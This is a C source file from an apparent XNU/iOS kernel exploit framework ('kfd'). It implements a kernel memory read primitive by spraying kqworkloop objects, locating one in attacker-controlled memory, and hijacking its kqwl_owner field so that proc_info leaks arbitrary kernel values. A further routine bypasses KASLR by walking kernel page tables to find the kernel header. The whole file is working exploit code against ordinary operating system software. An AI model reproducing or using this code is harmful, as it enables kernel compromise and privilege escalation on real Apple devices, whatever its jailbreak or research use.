
#include "kread_kqueue_workloop_ctl.h"

#pragma clang diagnostic ignored "-Wdeprecated-declarations"

const uint64_t kread_kqueue_workloop_ctl_sentinel = 0x1122334455667788;

void kread_kqueue_workloop_ctl_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = 100000;
    kfd->kread.krkw_object_size = dynamic_sizeof(kqworkloop);
}

void kread_kqueue_workloop_ctl_allocate(struct kfd* kfd, uint64_t id)
{
    struct kqueue_workloop_params params = {
        .kqwlp_version = (int32_t)(sizeof(params)),
        .kqwlp_flags = KQ_WORKLOOP_CREATE_SCHED_PRI,
        .kqwlp_id = id + kread_kqueue_workloop_ctl_sentinel,
        .kqwlp_sched_pri = 1,
    };

    uint64_t  cmd = KQ_WORKLOOP_CREATE;
    uint64_t  options = 0;
    uint64_t  addr = (uint64_t)(&params);
    uintptr_t sz = (uintptr_t)(params.kqwlp_version);
    assert_bsd(syscall(SYS_kqueue_workloop_ctl, cmd, options, addr, sz));
}

bool kread_kqueue_workloop_ctl_search(struct kfd* kfd, uint64_t object_uaddr)
{
    uint64_t sentinel_min = kread_kqueue_workloop_ctl_sentinel;
    uint64_t sentinel_max = sentinel_min + kfd->kread.krkw_allocated_id;

    uint16_t kqwl_state = dynamic_uget(kqworkloop, kqwl_state, object_uaddr);
    uint64_t kqwl_dynamicid = dynamic_uget(kqworkloop, kqwl_dynamicid, object_uaddr);

    if ((kqwl_state == (KQ_KEV_QOS | KQ_WORKLOOP | KQ_DYNAMIC)) &&
        (kqwl_dynamicid >= sentinel_min) &&
        (kqwl_dynamicid < sentinel_max)) {
        uint64_t object_id = kqwl_dynamicid - sentinel_min;
        kfd->kread.krkw_object_id = object_id;
        return true;
    }

    return false;
}

void kread_kqueue_workloop_ctl_kread(struct kfd* kfd, uint64_t kaddr, void* uaddr, uint64_t size)
{
    volatile uint64_t* type_base = (volatile uint64_t*)(uaddr);
    uint64_t type_size = ((size) / (sizeof(uint64_t)));
    for (uint64_t type_offset = 0; type_offset < type_size; type_offset++) {
        uint64_t type_value = kread_kqueue_workloop_ctl_kread_u64(kfd, kaddr + (type_offset * sizeof(uint64_t)));
        type_base[type_offset] = type_value;
    }
}

//thanks to @wh1te4ever!
void kread_kqueue_workloop_ctl_kaslr(struct kfd* kfd, uint64_t task_kaddr)
{
    uint64_t kerntask_vm_map = 0;
    kread_kqueue_workloop_ctl_kread(kfd, task_kaddr + 0x28, &kerntask_vm_map, sizeof(kerntask_vm_map));
    kerntask_vm_map = kerntask_vm_map | 0xffffff8000000000;
    
    uint64_t kerntask_pmap = 0;
    kread_kqueue_workloop_ctl_kread(kfd, kerntask_vm_map + 0x40, &kerntask_pmap, sizeof(kerntask_pmap));
    kerntask_pmap = kerntask_pmap | 0xffffff8000000000;
    
    /* Pointer to the root translation table. */ /* translation table entry */
    uint64_t kerntask_tte = 0;
    kread_kqueue_workloop_ctl_kread(kfd, kerntask_pmap, &kerntask_tte, sizeof(kerntask_tte));
    kerntask_tte = kerntask_tte | 0xffffff8000000000;
    
    uint64_t kerntask_tte_page = kerntask_tte & ~(0xfff);
    
    uint64_t kbase = 0;
    while (true) {
        uint64_t val = 0;
        kread_kqueue_workloop_ctl_kread(kfd, kerntask_tte_page, &val, sizeof(val));
        if(val == 0x100000cfeedfacf) {
            kread_kqueue_workloop_ctl_kread(kfd, kerntask_tte_page + 0x18, &val, sizeof(val)); //check if mach_header_64->flags, mach_header_64->reserved are all 0
            if(val == 0) {
                kbase = kerntask_tte_page;
                break;
            }
        }
        kerntask_tte_page -= 0x1000;
    }
    kfd->info.kernel.kernel_slide = kbase - 0xFFFFFFF007004000;
}

void kread_kqueue_workloop_ctl_find_proc(struct kfd* kfd)
{
    uint64_t kqworkloop_uaddr = kfd->kread.krkw_object_uaddr;
    kfd->info.kernel.current_proc = dynamic_uget(kqworkloop, kqwl_p, kqworkloop_uaddr);
    
}

void kread_kqueue_workloop_ctl_deallocate(struct kfd* kfd, uint64_t id)
{
    struct kqueue_workloop_params params = {
        .kqwlp_version = (int32_t)(sizeof(params)),
        .kqwlp_id = id + kread_kqueue_workloop_ctl_sentinel,
    };

    uint64_t  cmd = KQ_WORKLOOP_DESTROY;
    uint64_t  options = 0;
    uint64_t  addr = (uint64_t)(&params);
    uintptr_t sz = (uintptr_t)(params.kqwlp_version);
    assert_bsd(syscall(SYS_kqueue_workloop_ctl, cmd, options, addr, sz));
}

void kread_kqueue_workloop_ctl_free(struct kfd* kfd)
{
    kread_kqueue_workloop_ctl_deallocate(kfd, kfd->kread.krkw_object_id);
}

/*
 * 64-bit kread function.
 */

uint64_t kread_kqueue_workloop_ctl_kread_u64(struct kfd* kfd, uint64_t kaddr)
{
    uint64_t kqworkloop_uaddr = kfd->kread.krkw_object_uaddr;
    uint64_t old_kqwl_owner = dynamic_uget(kqworkloop, kqwl_owner, kqworkloop_uaddr);
    uint64_t new_kqwl_owner = kaddr - dynamic_offsetof(thread, thread_id);
    dynamic_uset(kqworkloop, kqwl_owner, kqworkloop_uaddr, new_kqwl_owner);

    struct kqueue_dyninfo data = {};
    int32_t  callnum = PROC_INFO_CALL_PIDDYNKQUEUEINFO;
    int32_t  pid = kfd->info.env.pid;
    uint32_t flavor = PROC_PIDDYNKQUEUE_INFO;
    uint64_t arg = kfd->kread.krkw_object_id + kread_kqueue_workloop_ctl_sentinel;
    uint64_t buffer = (uint64_t)(&data);
    int32_t  buffersize = (int32_t)(sizeof(struct kqueue_dyninfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    dynamic_uset(kqworkloop, kqwl_owner, kqworkloop_uaddr, old_kqwl_owner);
    return data.kqdi_owner;
}

